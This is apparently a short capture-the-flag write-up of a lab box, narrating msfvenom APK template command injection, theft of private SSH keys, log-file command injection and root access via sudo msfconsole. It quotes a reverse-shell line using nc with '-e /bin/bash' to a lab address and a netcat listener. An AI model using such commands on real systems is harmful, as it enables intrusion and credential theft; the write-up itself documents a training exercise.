One of the options was to create a msfvenom reverse shell payload as either windows, linux or android. You could also add a template file.<br /><a href="https://www.exploit-db.com/exploits/49491">https://www.exploit-db.com/exploits/49491</a><br /><a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md</a><br /><br />Moral of the story, if you upload this apk file to be used as a template (for an android msfvenom payload) it gave me a reverse shell.<br />The shell sucked so I downloaded the private ssh keys. Now I&#39;m kid.<br />kid could write to a log that would immediatlye be read by another user “pwn.”<br /><br />BIGGEST LESSON OF THE DAY... FUGGIN EMULATE<br />I was able to read the file that would execute what I put into the log file. The most helpful thing was copying it and breaking it down so that I knew what I needed to do to escape and execute.<br /><br />VVthe line ran to start a nc shell<br />echo &#39;[2021-02-08 20:29:55.652707] 1.1.1.1 &amp; /home/kid/logs/nc 10.10.14.11 3232 -e /bin/bash &amp;&#39; &gt; hackers &amp;&amp; cat hackers<br /><br />caught with nc -nlvp 3232. I am now PWN!<br />shell sucked so I stole pwn&#39;s private ssh keys.<br /><br />sudo -l showed that I could run msf as root with no password<br /><br />sudo /opt/.../msfconsole<br />from here I could just run commands as root! There are ways to get a better shell more than likely (exploit/multi/handler to myself)<br /></div></body></html>
